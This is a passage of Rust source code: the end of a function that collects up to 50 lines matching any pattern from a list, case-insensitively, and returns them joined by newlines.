                if patterns.iter().any(|p| lower.contains(&p.to_lowercase())) {
                    if matches.len() < 50 {
                        matches.push(line.to_string());
                    }
                }
            }
        }
    }
    matches.join("\n")
}
